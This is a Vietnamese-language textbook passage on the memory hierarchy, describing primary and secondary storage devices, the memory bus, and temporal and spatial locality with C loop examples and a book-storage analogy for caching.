<p><strong>Khoảng cách</strong> là yếu tố quan trọng vì cuối cùng, mọi dữ liệu mà chương trình muốn sử dụng đều phải sẵn sàng cho các thành phần số học của CPU — <strong>ALU</strong> (Arithmetic Logic Unit) — để xử lý. Các nhà thiết kế CPU đặt <strong>register</strong> gần ALU để giảm thiểu thời gian tín hiệu truyền giữa hai thành phần này. Do đó, mặc dù register chỉ lưu được vài byte và số lượng rất ít, nhưng giá trị lưu trong đó gần như có thể được ALU sử dụng ngay lập tức.<br />
Ngược lại, các thiết bị secondary storage như ổ đĩa truyền dữ liệu vào bộ nhớ thông qua nhiều bộ điều khiển (controller) được kết nối bằng dây dẫn dài hơn. Khoảng cách lớn hơn và quá trình xử lý trung gian này làm chậm đáng kể tốc độ của secondary storage.</p>
<blockquote>
<p><strong>Grace Hopper's &quot;Nanoseconds&quot;</strong><br />
Khi thuyết trình, nhà tiên phong trong lĩnh vực máy tính và Đô đốc Hải quân Hoa Kỳ <strong>Grace Hopper</strong> thường phát cho khán giả những đoạn dây dài 11,8 inch. Những đoạn dây này tượng trưng cho khoảng cách tối đa mà một tín hiệu điện có thể truyền trong một nanosecond, và được gọi là “Grace Hopper nanoseconds”.<br />
Bà dùng chúng để giải thích giới hạn độ trễ của truyền thông vệ tinh và minh họa lý do tại sao các thiết bị máy tính cần phải nhỏ để đạt tốc độ cao.<br />
Các bản ghi hình Grace Hopper trình bày về “nanoseconds” có thể xem <a href="https://www.youtube.com/watch?v=9eyFDBPk4Yw">trên YouTube</a>.</p>
</blockquote>
<p><strong>Công nghệ</strong> nền tảng cũng ảnh hưởng đáng kể đến hiệu năng thiết bị. <strong>Register</strong> và <strong>cache</strong> được xây dựng từ các mạch điện tương đối đơn giản, chỉ gồm một vài <strong>logic gate</strong>. Kích thước nhỏ và độ phức tạp tối thiểu giúp tín hiệu điện truyền qua nhanh, giảm độ trễ. Ở phía đối lập, các ổ đĩa cứng truyền thống chứa các <strong>magnetic platter</strong> (đĩa từ) quay để lưu trữ hàng trăm gigabyte dữ liệu. Mặc dù cung cấp mật độ lưu trữ cao, nhưng độ trễ truy cập của chúng khá lớn do phải căn chỉnh và quay cơ học các thành phần vào đúng vị trí.</p>
<p>Phần còn lại của mục này sẽ xem xét chi tiết về các thiết bị primary và secondary storage, đồng thời phân tích đặc điểm hiệu năng của chúng.</p>
<h3 id="1121-primary-storage"><a class="header" href="#1121-primary-storage">11.2.1. Primary Storage</a></h3>
<p><strong>Primary storage</strong> bao gồm <strong>random access memory</strong> (RAM — bộ nhớ truy cập ngẫu nhiên), nghĩa là thời gian truy cập dữ liệu không phụ thuộc vào vị trí dữ liệu trong thiết bị. Nói cách khác, RAM không cần quan tâm đến việc di chuyển các bộ phận cơ học vào đúng vị trí hoặc tua lại cuộn băng từ.<br />
Có hai loại RAM được sử dụng rộng rãi: <strong>static RAM</strong> (SRAM) và <strong>dynamic RAM</strong> (DRAM), và cả hai đều đóng vai trò quan trọng trong máy tính hiện đại. <strong>Bảng 1</strong> mô tả các thông số hiệu năng của các thiết bị primary storage phổ biến và loại RAM mà chúng sử dụng.</p>
<div class="table-wrapper"><table><thead><tr><th>Thiết bị (Device)</th><th>Dung lượng (Capacity)</th><th>Độ trễ xấp xỉ (Approx. latency)</th><th>Loại RAM (RAM type)</th></tr></thead><tbody>
<tr><td>Register</td><td>4 – 8 bytes</td><td>&lt; 1 ns</td><td>SRAM</td></tr>
<tr><td>CPU cache</td><td>1 – 32 megabytes</td><td>5 ns</td><td>SRAM</td></tr>
<tr><td>Main memory</td><td>4 – 64 gigabytes</td><td>100 ns</td><td>DRAM</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 1.</strong> Đặc điểm của các thiết bị <strong>Primary Storage</strong> (bộ nhớ chính) trên một workstation điển hình năm 2020</p>
<p><strong>SRAM</strong> lưu trữ dữ liệu trong các mạch điện nhỏ (ví dụ: <a href="C11-MemHierarchy/../C5-Arch/storagecircs.html#_rs_latch">latch</a>). Đây thường là loại bộ nhớ nhanh nhất, và các kỹ sư tích hợp trực tiếp nó vào CPU để xây dựng <a href="C11-MemHierarchy/../C5-Arch/storagecircs.html#_cpu_register">register</a> và cache.<br />
Tuy nhiên, <strong>SRAM</strong> tương đối đắt — cả về chi phí sản xuất, chi phí vận hành (tiêu thụ điện năng), và diện tích chiếm dụng trên chip. Tổng hợp các yếu tố này giới hạn lượng SRAM mà một CPU có thể tích hợp.</p>
<p><strong>DRAM</strong> lưu trữ dữ liệu bằng các linh kiện điện tử gọi là <em>capacitor</em> (tụ điện), có khả năng giữ điện tích. Nó được gọi là “dynamic” vì hệ thống DRAM phải thường xuyên <strong>refresh</strong> (làm mới) điện tích của các tụ để duy trì giá trị lưu trữ.<br />
Các hệ thống hiện đại sử dụng DRAM để triển khai <strong>main memory</strong> (bộ nhớ chính) trên các module kết nối với CPU thông qua một liên kết tốc độ cao gọi là <strong>memory bus</strong>.</p>
<p><strong>Hình 1</strong> minh họa vị trí của các thiết bị primary storage so với <strong>memory bus</strong>.<br />
Để lấy một giá trị từ bộ nhớ, CPU đặt <strong>address</strong> (địa chỉ) của dữ liệu cần lấy lên memory bus và gửi tín hiệu yêu cầu các module bộ nhớ thực hiện thao tác đọc. Sau một khoảng trễ ngắn, module bộ nhớ sẽ gửi giá trị tại địa chỉ được yêu cầu qua bus về CPU.</p>
<p><img src="C11-MemHierarchy/_images/MemoryBus.png" alt="The registers and ALU are nearby one another on the CPU. The CPU connects to main memory via a memory bus, which consists of several collections of wires for exchanging addresses, data, and control signals between the CPU and memory." /></p>
<p><strong>Hình 1.</strong> Kiến trúc primary storage và memory bus</p>
<p>Mặc dù CPU và main memory chỉ cách nhau vài inch về mặt vật lý, dữ liệu vẫn phải đi qua <strong>memory bus</strong> khi di chuyển giữa CPU và main memory. Khoảng cách bổ sung và các mạch điện trung gian này làm tăng <strong>latency</strong> (độ trễ) và giảm <strong>transfer rate</strong> (tốc độ truyền) của main memory so với bộ nhớ nằm trực tiếp trên CPU.<br />
Vì lý do này, memory bus đôi khi được gọi là <strong>von Neumann bottleneck</strong> (nút thắt cổ chai von Neumann).<br />
Tất nhiên, mặc dù hiệu năng thấp hơn, main memory vẫn là thành phần thiết yếu vì nó lưu trữ lượng dữ liệu lớn hơn nhiều bậc so với khả năng chứa của CPU. Giống như các dạng lưu trữ khác, luôn tồn tại sự đánh đổi rõ ràng giữa dung lượng và tốc độ.</p>
<p><strong>CPU cache</strong> (phát âm là “cash”) nằm ở vị trí trung gian giữa register và main memory, cả về vị trí vật lý lẫn đặc điểm hiệu năng và dung lượng. CPU cache thường lưu trữ từ vài kilobyte đến vài megabyte dữ liệu trực tiếp trên CPU, nhưng về mặt vật lý, cache không gần ALU bằng register.<br />
Do đó, cache nhanh hơn main memory, nhưng vẫn cần nhiều chu kỳ hơn so với register để cung cấp dữ liệu cho quá trình tính toán.</p>
<p>Thay vì lập trình viên phải nạp dữ liệu vào cache một cách tường minh, mạch điều khiển bên trong CPU sẽ tự động lưu trữ một phần nội dung của main memory vào cache. CPU điều khiển chiến lược phần dữ liệu nào của main memory được lưu trong cache sao cho càng nhiều yêu cầu bộ nhớ càng được phục vụ từ cache (vốn có hiệu năng cao hơn nhiều).<br />
Các phần sau của chương này sẽ mô tả các quyết định thiết kế trong việc xây dựng cache và các thuật toán xác định dữ liệu nào nên được lưu trữ.</p>
<p>Các hệ thống thực tế tích hợp nhiều cấp cache hoạt động như một phiên bản thu nhỏ của <strong>memory hierarchy</strong>. Ví dụ, CPU có thể có một <strong>L1 cache</strong> rất nhỏ và nhanh, lưu một phần dữ liệu của <strong>L2 cache</strong> lớn hơn và chậm hơn một chút, và L2 lại lưu một phần dữ liệu của <strong>L3 cache</strong> lớn hơn và chậm hơn nữa.<br />
Phần còn lại của mục này sẽ mô tả hệ thống chỉ có một cache duy nhất, nhưng sự tương tác giữa các cache trong hệ thống thực tế cũng tương tự như sự tương tác giữa một cache và main memory được trình bày sau đây.</p>
<blockquote>
<p>Nếu bạn tò mò về kích thước cache và main memory trên hệ thống của mình, lệnh <code>lscpu</code> sẽ in thông tin về CPU (bao gồm dung lượng cache).<br />
Chạy <code>free -m</code> sẽ hiển thị dung lượng main memory của hệ thống tính theo megabyte.</p>
</blockquote>
<h3 id="1122-secondary-storage-bộ-nhớ-phụ"><a class="header" href="#1122-secondary-storage-bộ-nhớ-phụ">11.2.2. Secondary Storage (Bộ nhớ phụ)</a></h3>
<p>Về mặt vật lý, các thiết bị <strong>secondary storage</strong> kết nối với hệ thống ở vị trí còn xa CPU hơn cả <strong>main memory</strong> (bộ nhớ chính). So với hầu hết các thiết bị máy tính khác, secondary storage đã trải qua sự thay đổi mạnh mẽ trong nhiều năm qua và vẫn tiếp tục thể hiện sự đa dạng về thiết kế hơn các thành phần khác.<br />
Một thiết bị mang tính biểu tượng là <a href="https://en.wikipedia.org/wiki/Punched_card">punch card</a> (thẻ đục lỗ), cho phép con người lưu trữ dữ liệu bằng cách tạo các lỗ nhỏ trên một tấm giấy cứng, tương tự như thẻ chỉ mục. Punch card, với thiết kế có từ cuộc điều tra dân số Hoa Kỳ năm 1890, đã lưu trữ dữ liệu người dùng (thường là chương trình) một cách đáng tin cậy từ những năm 1960 cho đến những năm 1970.</p>
<p>Một <a href="https://en.wikipedia.org/wiki/Magnetic_tape_data_storage">tape drive</a> (ổ băng từ) lưu dữ liệu trên một cuộn băng từ. Mặc dù thường cung cấp <strong>storage density</strong> (mật độ lưu trữ) tốt (nhiều thông tin trong kích thước nhỏ) với chi phí thấp, nhưng tape drive có tốc độ truy cập chậm vì phải cuộn băng đến đúng vị trí.<br />
Mặc dù hầu hết người dùng máy tính ngày nay ít gặp chúng, tape drive vẫn thường được sử dụng cho các tác vụ lưu trữ khối lượng lớn (ví dụ: sao lưu dữ liệu lớn) trong đó việc đọc lại dữ liệu là hiếm. Các tape drive hiện đại đóng gói cuộn băng từ vào các <strong>cartridge</strong> (hộp băng) nhỏ để dễ sử dụng.</p>
<p><img src="C11-MemHierarchy/_images/StorageDevices.png" alt="Photos of classic secondary storage devices." /></p>
<p><strong>Hình 2.</strong> Ví dụ ảnh của (a) punch card, (b) cuộn băng từ, và (c) nhiều kích thước <strong>floppy disk</strong>. Ảnh từ <a href="https://www.wikipedia.org/">Wikipedia</a>.</p>
<p>Các <strong>removable media</strong> (phương tiện lưu trữ rời) như <a href="https://en.wikipedia.org/wiki/Floppy_disk">floppy disk</a> và <a href="https://en.wikipedia.org/wiki/Optical_disc">optical disc</a> là một dạng secondary storage phổ biến khác.<br />
Floppy disk chứa một trục quay của vật liệu ghi từ, quay dưới một <strong>disk head</strong> (đầu đọc/ghi) để đọc và ghi nội dung.<br />
Optical disc như CD, DVD và Blu-ray lưu thông tin thông qua các vết lõm nhỏ trên bề mặt đĩa. Ổ đọc đĩa chiếu tia laser vào bề mặt, và sự có hoặc không có vết lõm sẽ làm tia phản xạ (hoặc không), code hóa thành các bit 0 và 1.</p>
<h4 id="modern-secondary-storage-bộ-nhớ-phụ-hiện-đại"><a class="header" href="#modern-secondary-storage-bộ-nhớ-phụ-hiện-đại">Modern Secondary Storage (Bộ nhớ phụ hiện đại)</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Thiết bị (Device)</th><th>Dung lượng (Capacity)</th><th>Độ trễ (Latency)</th><th>Tốc độ truyền (Transfer rate)</th></tr></thead><tbody>
<tr><td>Flash disk</td><td>0.5 – 2 terabytes</td><td>0.1 – 1 ms</td><td>200 – 3,000 megabytes/second</td></tr>
<tr><td>Traditional hard disk</td><td>0.5 – 10 terabytes</td><td>5 – 10 ms</td><td>100 – 200 megabytes/second</td></tr>
<tr><td>Remote network server</td><td>Thay đổi đáng kể</td><td>20 – 200 ms</td><td>Thay đổi đáng kể</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 2.</strong> Đặc điểm của các thiết bị secondary storage trên một workstation điển hình năm 2020</p>
<p><strong>Bảng 2</strong> mô tả các thiết bị secondary storage thường có trên workstation hiện nay.<br />
<strong>Hình 3</strong> cho thấy đường đi từ secondary storage đến main memory thường phải qua nhiều <strong>device controller</strong> (bộ điều khiển thiết bị) trung gian.<br />
Ví dụ, một ổ cứng thông thường kết nối tới <strong>Serial ATA controller</strong>, sau đó kết nối tới <strong>system I/O controller</strong>, rồi mới kết nối tới <strong>memory bus</strong>.<br />
Các thiết bị trung gian này giúp ổ đĩa dễ sử dụng hơn bằng cách trừu tượng hóa chi tiết giao tiếp ổ đĩa khỏi <strong>OS</strong> và lập trình viên. Tuy nhiên, chúng cũng tạo ra độ trễ truyền dữ liệu khi dữ liệu phải đi qua nhiều thiết bị bổ sung.</p>
<p><img src="C11-MemHierarchy/_images/IOBus.png" alt="The CPU cache is located on the CPU, in between the registers and the CPU's connection to the memory bus. Also connected to the memory bus is an I/O controller, which in turn connects to several other more specific controllers like SATA, USB, and IDE." /></p>
<p><strong>Hình 3.</strong> Secondary storage và kiến trúc I/O bus</p>
<p>Hai loại secondary storage phổ biến nhất hiện nay là <strong>hard disk drive</strong> (HDD) và <strong>solid-state drive</strong> (SSD) dựa trên flash.<br />
Một HDD gồm một số <strong>platter</strong> (đĩa) phẳng, tròn, làm từ vật liệu cho phép ghi từ. Các platter quay nhanh, thường ở tốc độ từ 5.000 đến 15.000 vòng/phút. Khi platter quay, một <strong>mechanical arm</strong> (cần cơ khí) nhỏ với <strong>disk head</strong> ở đầu di chuyển qua bề mặt platter để đọc hoặc ghi dữ liệu trên các <strong>track</strong> (rãnh) đồng tâm.</p>
<p><strong>Hình 4</strong> minh họa các thành phần chính của một <a href="https://en.wikipedia.org/wiki/Hard_disk_drive">hard disk</a>.<br />
Trước khi truy cập dữ liệu, ổ đĩa phải căn chỉnh disk head với track chứa dữ liệu mong muốn. Việc căn chỉnh này yêu cầu di chuyển cần cơ khí ra hoặc vào cho đến khi đầu đọc nằm đúng trên track.<br />
Quá trình di chuyển cần này gọi là <strong>seeking</strong>, và vì cần chuyển động cơ học, nó tạo ra một khoảng trễ nhỏ gọi là <strong>seek time</strong> (vài millisecond).<br />
Khi cần đã ở đúng vị trí, ổ đĩa phải chờ platter quay đến khi disk head nằm đúng trên vị trí chứa dữ liệu mong muốn. Điều này tạo ra một khoảng trễ ngắn khác (vài millisecond), gọi là <strong>rotational latency</strong>.<br />
Do đặc điểm cơ học này, HDD có độ trễ truy cập cao hơn đáng kể so với các thiết bị primary storage đã mô tả trước đó.</p>
<p><img src="C11-MemHierarchy/_images/DiskParts.png" alt="A photo of the internals of a hard disk with its parts labeled." /></p>
<p><strong>Hình 4.</strong> Các thành phần chính của một hard disk drive</p>
<p>Trong vài năm gần đây, <strong>SSD</strong> — không có bộ phận chuyển động (và do đó có độ trễ thấp hơn) — đã nhanh chóng trở nên phổ biến. Chúng được gọi là <strong>solid-state drive</strong> vì không dựa vào chuyển động cơ học.<br />
Mặc dù tồn tại nhiều công nghệ solid-state khác nhau, <a href="https://en.wikipedia.org/wiki/Flash_memory">flash memory</a> vẫn chiếm ưu thế trong các thiết bị SSD thương mại.<br />
Chi tiết kỹ thuật của flash memory nằm ngoài phạm vi cuốn sách này, nhưng có thể nói rằng các thiết bị dựa trên flash cho phép đọc, ghi và xóa dữ liệu với tốc độ nhanh hơn HDD truyền thống.<br />
Dù chưa lưu trữ dữ liệu với mật độ cao bằng các thiết bị cơ học, SSD đã gần như thay thế hoàn toàn ổ đĩa quay trong hầu hết các thiết bị tiêu dùng như laptop.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="113-locality-tính-cục-bộ"><a class="header" href="#113-locality-tính-cục-bộ">11.3. Locality (Tính cục bộ)</a></h2>
<p>Bởi vì <a href="C11-MemHierarchy/mem_hierarchy.html#_the_memory_hierarchy">các thiết bị bộ nhớ rất khác nhau</a> về đặc điểm hiệu năng và dung lượng lưu trữ, các hệ thống hiện đại tích hợp nhiều dạng lưu trữ khác nhau. May mắn thay, hầu hết các chương trình đều thể hiện các mẫu truy cập bộ nhớ phổ biến, được gọi là <strong>locality</strong> (tính cục bộ), và các kỹ sư phần cứng thiết kế hệ thống để khai thác locality tốt nhằm tự động di chuyển dữ liệu vào vị trí lưu trữ thích hợp.<br />
Cụ thể, một hệ thống cải thiện hiệu năng bằng cách di chuyển phần dữ liệu mà chương trình đang sử dụng tích cực vào bộ nhớ nằm gần mạch tính toán của CPU (ví dụ: trong <strong>register</strong> hoặc <strong>CPU cache</strong>). Khi dữ liệu cần thiết di chuyển lên các cấp cao hơn trong <strong>memory hierarchy</strong> (hệ phân cấp bộ nhớ) về phía CPU, dữ liệu không sử dụng sẽ được đẩy xuống các cấp lưu trữ chậm hơn cho đến khi chương trình cần lại.</p>
<p>Đối với một nhà thiết kế hệ thống, việc xây dựng một hệ thống khai thác locality là một bài toán <strong>abstraction</strong> (trừu tượng hóa). Hệ thống cung cấp một cái nhìn trừu tượng về các thiết bị bộ nhớ sao cho lập trình viên cảm thấy như họ có tổng dung lượng của tất cả các loại bộ nhớ, nhưng với đặc điểm hiệu năng của bộ nhớ nhanh nằm trên chip.<br />
Tất nhiên, việc mang lại “ảo tưởng màu hồng” này cho người dùng không thể đạt được một cách hoàn hảo, nhưng bằng cách khai thác locality của chương trình, các hệ thống hiện đại đạt được hiệu năng tốt cho hầu hết các chương trình được viết tốt.</p>
<p>Các hệ thống chủ yếu khai thác hai dạng locality:</p>
<ol>
<li><strong>Temporal locality</strong>: Chương trình có xu hướng truy cập cùng một dữ liệu nhiều lần theo thời gian. Nghĩa là, nếu một chương trình vừa sử dụng một biến gần đây, khả năng cao là nó sẽ sử dụng lại biến đó sớm.</li>
<li><strong>Spatial locality</strong>: Chương trình có xu hướng truy cập dữ liệu nằm gần dữ liệu đã được truy cập trước đó. “Gần” ở đây đề cập đến địa chỉ bộ nhớ của dữ liệu. Ví dụ, nếu một chương trình truy cập dữ liệu tại địa chỉ <em>N</em> và <em>N+4</em>, thì khả năng cao nó sẽ truy cập <em>N+8</em> ngay sau đó.</li>
</ol>
<h3 id="1131-ví-dụ-về-locality-trong-mã-nguồn"><a class="header" href="#1131-ví-dụ-về-locality-trong-mã-nguồn">11.3.1. Ví dụ về Locality trong mã nguồn</a></h3>
<p>May mắn thay, các mẫu lập trình phổ biến thường thể hiện cả hai dạng locality này. Hãy xem xét ví dụ hàm sau:</p>
<pre><code class="language-c">/* Sum up the elements in an integer array of length len. */
int sum_array(int *array, int len) {
    int i;
    int sum = 0;

    for (i = 0; i &lt; len; i++) {
        sum += array[i];
    }

    return sum;
}
</code></pre>
<p>Trong đoạn code này, tính lặp lại của vòng lặp <code>for</code> tạo ra <strong>temporal locality</strong> cho các biến <code>i</code>, <code>len</code>, <code>sum</code>, và <code>array</code> (địa chỉ gốc của mảng), vì chương trình truy cập từng biến này trong mỗi vòng lặp.<br />
Khai thác temporal locality cho phép hệ thống chỉ cần nạp mỗi biến từ main memory vào CPU cache một lần. Mọi lần truy cập sau đó đều có thể được phục vụ từ cache — vốn nhanh hơn rất nhiều.</p>
<p>Các truy cập vào nội dung của mảng cũng được hưởng lợi từ <strong>spatial locality</strong>. Mặc dù chương trình chỉ truy cập mỗi phần tử mảng một lần, hệ thống hiện đại sẽ nạp nhiều hơn một giá trị <code>int</code> từ bộ nhớ vào CPU cache mỗi lần.<br />
Nói cách khác, khi truy cập phần tử đầu tiên của mảng, cache sẽ chứa không chỉ giá trị đó mà còn cả một vài giá trị tiếp theo. Số lượng giá trị bổ sung được nạp vào cache phụ thuộc vào <strong>block size</strong> (kích thước khối) của cache — tức lượng dữ liệu được chuyển vào cache trong một lần.</p>
<p>Ví dụ, với block size là 16 byte, hệ thống sẽ sao chép bốn số nguyên (<code>int</code>) từ bộ nhớ vào cache mỗi lần. Do đó, việc truy cập số nguyên đầu tiên phải chịu chi phí cao của việc truy cập main memory, nhưng ba lần truy cập tiếp theo sẽ được phục vụ từ cache, ngay cả khi chương trình chưa từng truy cập chúng trước đó.</p>
<p>Trong nhiều trường hợp, lập trình viên có thể hỗ trợ hệ thống bằng cách cố ý viết code thể hiện các mẫu locality tốt. Ví dụ, hãy xem xét vòng lặp lồng nhau truy cập mọi phần tử của một ma trận <em>N</em>×<em>N</em> (ví dụ này cũng đã xuất hiện ở phần mở đầu của chương):</p>
<h4 id="averagemat_v1-1"><a class="header" href="#averagemat_v1-1">averageMat_v1</a></h4>
<pre><code class="language-c">float averageMat_v1(int **mat, int n) {
    int i, j, total = 0;
    for (i = 0; i &lt; n; i++) {
        for (j = 0; j &lt; n; j++) {
            // Note indexing: [i][j]
            total += mat[i][j];
        }
    }
    return (float) total / (n * n);
}
</code></pre>
<h4 id="averagemat_v2-1"><a class="header" href="#averagemat_v2-1">averageMat_v2</a></h4>
<pre><code class="language-c">float averageMat_v2(int **mat, int n) {
    int i, j, total = 0;
    for (i = 0; i &lt; n; i++) {
        for (j = 0; j &lt; n; j++) {
            // Note indexing: [j][i]
            total += mat[j][i];
        }
    }
    return (float) total / (n * n);
}
</code></pre>
<p><strong>Bảng 1.</strong> Hai phiên bản của một hàm truy cập mọi phần tử của ma trận <em>N</em>×<em>N</em>. Chúng chỉ khác nhau ở cách đánh chỉ số khi truy cập bộ nhớ, nhưng phiên bản 1 (bên trái) chạy nhanh hơn khoảng 5 lần.</p>
<p>Trong cả hai phiên bản, các biến vòng lặp (<code>i</code> và <code>j</code>) và biến tích lũy (<code>total</code>) đều thể hiện <strong>temporal locality</strong> (tính cục bộ theo thời gian) tốt vì vòng lặp sử dụng lại chúng nhiều lần trong mỗi lần lặp. Do đó, khi thực thi đoạn code này, hệ thống sẽ lưu các biến đó trong các vị trí lưu trữ nhanh nằm trên CPU để đạt hiệu năng tốt.</p>
<p>Tuy nhiên, do <a href="C11-MemHierarchy/../C2-C_depth/arrays.html#_two_dimensional_array_memory_layout">tổ chức ma trận trong bộ nhớ theo <em>row-major order</em></a>, phiên bản đầu tiên của code (bên trái) chạy nhanh hơn khoảng 5 lần so với phiên bản thứ hai (bên phải). Sự khác biệt này xuất phát từ sự khác nhau về <strong>spatial locality</strong> (tính cục bộ theo không gian) — phiên bản đầu tiên truy cập các giá trị của ma trận theo thứ tự tuần tự trong bộ nhớ (tức là theo các địa chỉ bộ nhớ liên tiếp). Vì vậy, nó tận dụng được lợi ích từ hệ thống khi nạp các khối dữ liệu lớn từ bộ nhớ vào cache, bởi vì nó chỉ phải trả chi phí truy cập bộ nhớ một lần cho mỗi khối giá trị.</p>
<p>Phiên bản thứ hai truy cập các giá trị của ma trận bằng cách liên tục nhảy giữa các hàng qua các địa chỉ bộ nhớ không tuần tự. Nó <em>không bao giờ</em> đọc từ cùng một cache block trong các lần truy cập bộ nhớ liên tiếp, nên đối với cache, block đó trông như không cần thiết. Vì vậy, nó phải trả chi phí truy cập bộ nhớ cho từng giá trị của ma trận mà nó đọc.</p>
<p>Ví dụ này minh họa cách lập trình viên có thể ảnh hưởng đến chi phí ở cấp hệ thống của việc thực thi chương trình. Hãy ghi nhớ các nguyên tắc này khi viết các ứng dụng hiệu năng cao, đặc biệt là những ứng dụng truy cập mảng theo một mẫu đều đặn.</p>
<h3 id="1132-từ-locality-đến-cache"><a class="header" href="#1132-từ-locality-đến-cache">11.3.2. Từ Locality đến Cache</a></h3>
<p>Để minh họa cách các khái niệm <strong>temporal locality</strong> và <strong>spatial locality</strong> hỗ trợ thiết kế cache, chúng ta sẽ sử dụng một ví dụ quen thuộc với các đối tượng đời thực: sách.<br />
Giả sử Fiona làm tất cả bài tập của mình tại một chiếc bàn trong phòng ký túc xá, và chiếc bàn này chỉ có chỗ để ba cuốn sách. Ngay bên ngoài phòng, cô có một giá sách với nhiều chỗ hơn bàn. Cuối cùng, ở phía bên kia khuôn viên trường, thư viện của trường có một lượng sách khổng lồ.<br />
“<strong>Book storage hierarchy</strong>” (hệ phân cấp lưu trữ sách) trong ví dụ này có thể trông giống như <strong>Hình 1</strong>. Dựa trên kịch bản này, chúng ta sẽ khám phá cách locality có thể giúp quyết định vị trí lưu trữ sách mà Fiona nên chọn.</p>
<p><img src="C11-MemHierarchy/_images/BookHierarchy.png" alt="In order, from (quick access, low capacity) to (slow access, high capacity): desk, shelf, library." /></p>
<p><strong>Hình 1.</strong> Ví dụ giả định về hệ phân cấp lưu trữ sách</p>
<h3 id="1133-temporal-locality"><a class="header" href="#1133-temporal-locality">11.3.3. Temporal Locality</a></h3>
<p><strong>Temporal locality</strong> gợi ý rằng, nếu có một cuốn sách Fiona sử dụng thường xuyên, cô nên giữ nó càng gần bàn làm việc càng tốt. Nếu thỉnh thoảng cần chuyển nó ra giá sách để dọn chỗ làm việc tạm thời thì chi phí không quá lớn, nhưng sẽ thật vô lý nếu mang sách trả lại thư viện khi cô sẽ cần nó vào ngày hôm sau.<br />
Điều ngược lại cũng đúng: nếu có một cuốn sách chiếm chỗ quý giá trên bàn hoặc giá sách mà cô đã lâu không dùng, thì đó là ứng viên tốt để trả lại thư viện.</p>
<p>Vậy, những cuốn sách nào nên được Fiona đặt ở vị trí quý giá trên bàn? Trong ví dụ này, sinh viên thực tế có thể sẽ xem các bài tập sắp tới và chọn những cuốn sách mà họ dự đoán sẽ hữu ích nhất. Nói cách khác, để đưa ra quyết định lưu trữ tốt nhất, họ cần thông tin về <em>việc sử dụng trong tương lai</em>.</p>
<p>Thật không may, các kỹ sư phần cứng chưa tìm ra cách chế tạo mạch có thể dự đoán tương lai. Thay vì dự đoán, ta có thể tưởng tượng một hệ thống yêu cầu lập trình viên hoặc người dùng thông báo trước cho hệ thống cách một chương trình sẽ sử dụng dữ liệu để tối ưu vị trí lưu trữ. Chiến lược này có thể hoạt động tốt trong các ứng dụng chuyên biệt (ví dụ: cơ sở dữ liệu lớn) với mẫu truy cập <em>rất</em> đều đặn. Tuy nhiên, trong một hệ thống đa dụng như máy tính cá nhân, việc yêu cầu người dùng cung cấp trước thông tin chi tiết là một gánh nặng quá lớn — nhiều người sẽ không muốn (hoặc không thể) cung cấp đủ thông tin để hệ thống đưa ra quyết định tốt.</p>
<p>Do đó, thay vì dựa vào thông tin truy cập trong tương lai, các hệ thống nhìn vào quá khứ như một cách dự đoán điều <em>có khả năng</em> xảy ra trong tương lai. Áp dụng ý tưởng này vào ví dụ về sách gợi ý một chiến lược tương đối đơn giản (nhưng vẫn khá hiệu quả) để quản lý không gian lưu trữ sách:</p>
<ul>
<li>Khi Fiona cần dùng một cuốn sách, cô lấy nó từ nơi hiện tại và đặt lên bàn.</li>
<li>Nếu bàn đã đầy, cô chuyển cuốn sách mà cô dùng <em>lâu nhất</em> (tức là cuốn đã nằm trên bàn lâu nhất mà không được động tới) ra giá sách.</li>
<li>Nếu giá sách đã đầy, cô trả cuốn sách lâu nhất trên giá về thư viện để giải phóng chỗ.</li>
</ul>
<p>Mặc dù cách này không hoàn hảo, nhưng sự đơn giản khiến nó hấp dẫn. Nó chỉ yêu cầu khả năng di chuyển sách giữa các vị trí lưu trữ và một lượng nhỏ <strong>metainformation</strong> (siêu thông tin) về thứ tự sử dụng sách trước đây. Hơn nữa, chiến lược này đáp ứng tốt hai mục tiêu ban đầu của temporal locality:</p>
<ol>
<li>Sách được dùng thường xuyên có khả năng ở lại trên bàn hoặc giá sách, tránh các chuyến đi không cần thiết đến thư viện.</li>
<li>Sách ít được dùng cuối cùng sẽ trở thành cuốn lâu nhất không được sử dụng, và khi đó việc trả nó về thư viện là hợp lý.</li>
</ol>
<p>Áp dụng chiến lược này cho các thiết bị <strong>primary storage</strong> (bộ nhớ chính) trông rất giống ví dụ về sách: khi dữ liệu được nạp vào <strong>CPU register</strong> từ <strong>main memory</strong>, hãy dành chỗ cho nó trong <strong>CPU cache</strong>. Nếu cache đã đầy, hãy tạo chỗ bằng cách <strong>evict</strong> (loại bỏ) dữ liệu trong cache ít được sử dụng nhất về main memory. Trong <a href="C11-MemHierarchy/caching.html#_cpu_caches">phần tiếp theo về caching</a>, chúng ta sẽ tìm hiểu chi tiết cách các cơ chế như vậy được tích hợp vào các hệ thống cache hiện đại.</p>
<h3 id="1134-spatial-locality"><a class="header" href="#1134-spatial-locality">11.3.4. Spatial Locality</a></h3>
<p><strong>Spatial locality</strong> gợi ý rằng, khi đã đến thư viện, Fiona nên lấy nhiều hơn một cuốn sách để giảm khả năng phải quay lại thư viện trong tương lai. Cụ thể, cô nên lấy thêm những cuốn sách “gần” cuốn mình cần, vì chúng có khả năng cao sẽ trở thành những cuốn mà cô cần sau này.</p>
<p>Giả sử cô đang học một khóa văn học về các vở lịch sử của Shakespeare. Nếu trong tuần đầu tiên của khóa học, cô được giao đọc <em>Henry VI, Part I</em>, khi đến thư viện lấy cuốn này, cô có khả năng sẽ tìm thấy <strong>Part II</strong> và <strong>Part III</strong> ngay gần đó trên kệ. Ngay cả khi chưa biết khóa học có yêu cầu đọc hai phần kia hay không, thì việc nghĩ rằng cô <em>có thể</em> cần chúng là hợp lý. Nói cách khác, khả năng cần chúng cao hơn nhiều so với một cuốn sách ngẫu nhiên trong thư viện, chính vì chúng ở gần cuốn cô cần.</p>
<p>Trong kịch bản này, khả năng đó tăng lên nhờ cách thư viện sắp xếp sách trên kệ, và các chương trình cũng tổ chức dữ liệu trong bộ nhớ theo cách tương tự. Ví dụ, một cấu trúc lập trình như <strong>array</strong> hoặc <code>struct</code> lưu trữ một tập hợp dữ liệu liên quan trong một vùng bộ nhớ liên tiếp. Khi duyệt qua các phần tử liên tiếp trong một mảng, rõ ràng tồn tại một mẫu không gian trong các địa chỉ bộ nhớ được truy cập.<br />
Áp dụng các bài học về spatial locality vào các thiết bị primary storage có nghĩa là khi lấy dữ liệu từ main memory, hệ thống cũng nên lấy cả dữ liệu nằm ngay xung quanh nó.</p>
